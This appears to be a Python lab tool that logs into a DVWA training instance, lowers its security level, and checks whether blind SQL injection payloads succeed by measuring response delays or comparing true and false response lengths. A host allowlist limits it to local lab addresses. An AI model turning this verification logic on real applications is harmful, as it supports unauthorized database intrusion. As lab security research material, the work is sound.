import time
import urllib.parse
import urllib.request
import http.cookiejar
import re


ALLOWED_HOSTS = {
    "127.0.0.1",
    "localhost",
    "192.168.64.7"
}

REQUEST_TIMEOUT = 10
TIME_THRESHOLD = 2.0
BOOLEAN_LENGTH_THRESHOLD = 20


class DVWAVerifier:

    def __init__(
        self,
        base_host="http://192.168.64.7",
        username="admin",
        password="password"
    ):

        self.base_host = base_host.rstrip("/")
        self.username = username
        self.password = password

        self.login_url = (
            f"{self.base_host}/dvwa/login.php"
        )

        self.security_url = (
            f"{self.base_host}/dvwa/security.php"
        )

        self.sqli_url = (
            f"{self.base_host}"
            f"/dvwa/vulnerabilities/sqli_blind/"
        )

        self.cookie_jar = http.cookiejar.CookieJar()

        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(
                self.cookie_jar
            )
        )

        self.opener.addheaders = [
            (
                "User-Agent",
                "ADEXA-Lab-Verifier/1.0"
            )
        ]

    # --------------------------------------------------
    # SAFETY / TARGET CHECK
    # --------------------------------------------------

    def is_allowed_target(self):

        try:

            parsed = urllib.parse.urlparse(
                self.base_host
            )

            return (
                parsed.hostname
                in ALLOWED_HOSTS
            )

        except Exception:

            return False

    # --------------------------------------------------
    # DVWA LOGIN
    # --------------------------------------------------

    def login(self):

        if not self.is_allowed_target():

            raise ValueError(
                "DVWA target is not an allowed lab host."
            )

        print("🔐 Logging into DVWA...")

        login_data = urllib.parse.urlencode({
            "username": self.username,
            "password": self.password,
            "Login": "Login"
        }).encode("utf-8")

        request = urllib.request.Request(
            self.login_url,
            data=login_data,
            method="POST"
        )

        try:

            with self.opener.open(
                request,
                timeout=REQUEST_TIMEOUT
            ) as response:

                body = response.read().decode(
                    "utf-8",
                    errors="ignore"
                )

        except Exception as e:

            print(
                f"❌ DVWA login failed: {e}"
            )

            return False

        body_lower = body.lower()

        if (
            "dvwa - login" in body_lower
            or
            'name="username"' in body_lower
        ):

            print("❌ DVWA rejected login")

            return False

        print("✅ DVWA login successful")

        if not self.set_security_low():

            print(
                "❌ Could not configure DVWA security"
            )

            return False

        return True

    # --------------------------------------------------
    # SET DVWA SECURITY = LOW
    # --------------------------------------------------

    def set_security_low(self):

        print(
            "🛡️ Setting DVWA security to low..."
        )

        data = urllib.parse.urlencode({
            "security": "low",
            "seclev_submit": "Submit"
        }).encode("utf-8")

        request = urllib.request.Request(
            self.security_url,
            data=data,
            method="POST"
        )

        try:

            with self.opener.open(
                request,
                timeout=REQUEST_TIMEOUT
            ) as response:

                response.read()

        except Exception as e:

            print(
                f"❌ Failed to set security level: {e}"
            )

            return False

        # Confirm using the actual SQLi Blind page
        try:

            with self.opener.open(
                self.sqli_url,
                timeout=REQUEST_TIMEOUT
            ) as response:

                check_body = response.read().decode(
                    "utf-8",
                    errors="ignore"
                )

        except Exception as e:

            print(
                f"❌ Security verification failed: {e}"
            )

            return False

        if "Security Level:</b> low" in check_body:

            print(
                "✅ DVWA security confirmed: low"
            )

            return True

        print(
            "❌ DVWA security is NOT low"
        )

        return False

    # --------------------------------------------------
    # BUILD REQUEST
    # --------------------------------------------------

    def build_sqli_url(
        self,
        payload
    ):

        query = urllib.parse.urlencode({
            "id": payload,
            "Submit": "Submit"
        })

        return (
            f"{self.sqli_url}?{query}"
        )

    # --------------------------------------------------
    # SEND PAYLOAD
    # --------------------------------------------------

    def send_payload(
        self,
        payload
    ):

        url = self.build_sqli_url(
            payload
        )

        request = urllib.request.Request(
            url
        )

        start = time.time()

        try:

            with self.opener.open(
                request,
                timeout=REQUEST_TIMEOUT
            ) as response:

                body = response.read().decode(
                    "utf-8",
                    errors="ignore"
                )

                status = response.status

        except Exception as e:

            elapsed = (
                time.time()
                -
                start
            )

            return {
                "success": False,
                "status": None,
                "elapsed": elapsed,
                "body_length": 0,
                "error": str(e)
            }

        elapsed = (
            time.time()
            -
            start
        )

        body_lower = body.lower()

        if (
            "dvwa - login" in body_lower
            or
            'name="username"' in body_lower
        ):

            return {
                "success": False,
                "status": status,
                "elapsed": elapsed,
                "body_length": len(body),
                "error": (
                    "DVWA session redirected "
                    "to login page"
                )
            }

        return {
            "success": True,
            "status": status,
            "elapsed": elapsed,
            "body_length": len(body),
            "body": body
        }

    # --------------------------------------------------
    # TIME VERIFICATION
    # --------------------------------------------------

    def verify_time_payload(
        self,
        payload
    ):

        result = self.send_payload(
            payload
        )

        if not result["success"]:

            return False, {
                "verified": False,
                "reason": "Payload request failed",
                "result": result
            }

        elapsed = result["elapsed"]

        verified = (
            elapsed >= TIME_THRESHOLD
        )

        return verified, {
            "verified": verified,
            "elapsed": elapsed,
            "threshold": TIME_THRESHOLD,
            "status": result["status"],
            "body_length": result["body_length"]
        }

    # --------------------------------------------------
    # CREATE FALSE BOOLEAN COUNTERPART
    # --------------------------------------------------

    def build_false_payload(
        self,
        payload
    ):

        # ASCII equality
        # ASCII('A')=65 -> ASCII('A')=66
        match = re.search(
            r"ASCII\('([^']+)'\)\s*=\s*(\d+)",
            payload,
            re.IGNORECASE
        )

        if match:

            false_value = (
                int(match.group(2)) + 1
            )

            replacement = (
                f"ASCII('{match.group(1)}')="
                f"{false_value}"
            )

            return (
                payload[:match.start()]
                + replacement
                + payload[match.end():]
            )

        # ASCII greater than
        # ASCII('B')>65 -> ASCII('B')<65
        match = re.search(
            r"ASCII\('([^']+)'\)\s*>\s*(\d+)",
            payload,
            re.IGNORECASE
        )

        if match:

            replacement = (
                f"ASCII('{match.group(1)}')<"
                f"{match.group(2)}"
            )

            return (
                payload[:match.start()]
                + replacement
                + payload[match.end():]
            )

        # ASCII less than
        match = re.search(
            r"ASCII\('([^']+)'\)\s*<\s*(\d+)",
            payload,
            re.IGNORECASE
        )

        if match:

            replacement = (
                f"ASCII('{match.group(1)}')>"
                f"{match.group(2)}"
            )

            return (
                payload[:match.start()]
                + replacement
                + payload[match.end():]
            )

        # LENGTH equality
        # LENGTH('abc')=3 -> LENGTH('abc')=4
        match = re.search(
            r"LENGTH\('([^']*)'\)\s*=\s*(\d+)",
            payload,
            re.IGNORECASE
        )

        if match:

            false_value = (
                int(match.group(2)) + 1
            )

            replacement = (
                f"LENGTH('{match.group(1)}')="
                f"{false_value}"
            )

            return (
                payload[:match.start()]
                + replacement
                + payload[match.end():]
            )

        # LENGTH greater than
        # LENGTH('abcd')>3 -> LENGTH('abcd')<3
        match = re.search(
            r"LENGTH\('([^']*)'\)\s*>\s*(\d+)",
            payload,
            re.IGNORECASE
        )

        if match:

            replacement = (
                f"LENGTH('{match.group(1)}')<"
                f"{match.group(2)}"
            )

            return (
                payload[:match.start()]
                + replacement
                + payload[match.end():]
            )

        # LENGTH less than
        match = re.search(
            r"LENGTH\('([^']*)'\)\s*<\s*(\d+)",
            payload,
            re.IGNORECASE
        )

        if match:

            replacement = (
                f"LENGTH('{match.group(1)}')>"
                f"{match.group(2)}"
            )

            return (
                payload[:match.start()]
                + replacement
                + payload[match.end():]
            )

        # String equality
        # 'a'='a' -> 'a'='ax'
        match = re.search(
            r"'([^']*)'\s*=\s*'([^']*)'",
            payload
        )

        if match:

            false_right = (
                match.group(2) + "x"
            )

            replacement = (
                f"'{match.group(1)}'="
                f"'{false_right}'"
            )

            return (
                payload[:match.start()]
                + replacement
                + payload[match.end():]
            )

        # String inequality
        # 'b'<>'a' -> 'b'<>'b'
        match = re.search(
            r"'([^']*)'\s*(?:<>|!=)\s*'([^']*)'",
            payload
        )

        if match:

            replacement = (
                f"'{match.group(1)}'="
                f"'{match.group(1)}'"
            )

            return (
                payload[:match.start()]
                + replacement
                + payload[match.end():]
            )

        # Numeric >=
        match = re.search(
            r"(\d+)\s*>=\s*(\d+)",
            payload
        )

        if match:

            replacement = (
                f"{match.group(1)}"
                f"<"
                f"{match.group(2)}"
            )

            return (
                payload[:match.start()]
                + replacement
                + payload[match.end():]
            )

        # Numeric >
        match = re.search(
            r"(\d+)\s*>\s*(\d+)",
            payload
        )

        if match:

            replacement = (
                f"{match.group(1)}"
                f"<"
                f"{match.group(2)}"
            )

            return (
                payload[:match.start()]
                + replacement
                + payload[match.end():]
            )

        # Numeric <
        match = re.search(
            r"(\d+)\s*<\s*(\d+)",
            payload
        )

        if match:

            replacement = (
                f"{match.group(1)}"
                f">"
                f"{match.group(2)}"
            )

            return (
                payload[:match.start()]
                + replacement
                + payload[match.end():]
            )

        # Numeric equality
        # 1=1 -> 1=2
        match = re.search(
            r"(\d+)\s*=\s*(\d+)",
            payload
        )

        if match:

            left = match.group(1)

            false_value = (
                int(match.group(2)) + 1
            )

            replacement = (
                f"{left}={false_value}"
            )

            return (
                payload[:match.start()]
                + replacement
                + payload[match.end():]
            )

        # Numeric inequality
        # 4<>5 -> 4=4
        match = re.search(
            r"(\d+)\s*(?:<>|!=)\s*(\d+)",
            payload
        )

        if match:

            replacement = (
                f"{match.group(1)}="
                f"{match.group(1)}"
            )

            return (
                payload[:match.start()]
                + replacement
                + payload[match.end():]
            )

        return None

    # --------------------------------------------------
    # BOOLEAN VERIFICATION
    # --------------------------------------------------

    def verify_boolean_payload(
        self,
        repaired_payload,
        broken_payload
    ):

        false_payload = self.build_false_payload(
            repaired_payload
        )

        if not false_payload:

            return False, {
                "verified": False,
                "reason": (
                    "Could not generate false counterpart"
                ),
                "repaired_payload":
                    repaired_payload
            }

        repaired_result = self.send_payload(
            repaired_payload
        )

        false_result = self.send_payload(
            false_payload
        )

        if not repaired_result["success"]:

            return False, {
                "verified": False,
                "reason": (
                    "Repaired request failed"
                ),
                "repaired": repaired_result
            }

        if not false_result["success"]:

            return False, {
                "verified": False,
                "reason": (
                    "False request failed"
                ),
                "false": false_result
            }

        repaired_length = (
            repaired_result["body_length"]
        )

        false_length = (
            false_result["body_length"]
        )

        length_difference = abs(
            repaired_length
            -
            false_length
        )

        status_difference = (
            repaired_result["status"]
            !=
            false_result["status"]
        )

        verified = (
            length_difference
            >=
            BOOLEAN_LENGTH_THRESHOLD
            or
            status_difference
        )

        return verified, {
            "verified": verified,
            "repaired_payload":
                repaired_payload,
            "false_payload":
                false_payload,
            "broken_payload":
                broken_payload,
            "repaired_length":
                repaired_length,
            "false_length":
                false_length,
            "length_difference":
                length_difference,
            "length_threshold":
                BOOLEAN_LENGTH_THRESHOLD,
            "repaired_status":
                repaired_result["status"],
            "false_status":
                false_result["status"],
            "status_difference":
                status_difference
        }

    # --------------------------------------------------
    # MAIN REPAIR VERIFICATION
    # --------------------------------------------------

    def verify_repair(
        self,
        entry
    ):

        repaired = entry.get(
            "repaired_payload",
            ""
        )

        broken = entry.get(
            "broken_payload",
            ""
        )

        strategy = entry.get(
            "strategy",
            ""
        )

        if not repaired:

            return False, {
                "verified": False,
                "reason":
                    "Missing repaired payload"
            }

        if strategy == "SWITCH_TIME":

            return (
                self.verify_time_payload(
                    repaired
                )
            )

        if strategy == "SWITCH_BOOLEAN":

            return (
                self.verify_boolean_payload(
                    repaired,
                    broken
                )
            )

        return False, {
            "verified": False,
            "reason": (
                f"Unsupported strategy: "
                f"{strategy}"
            )
        }
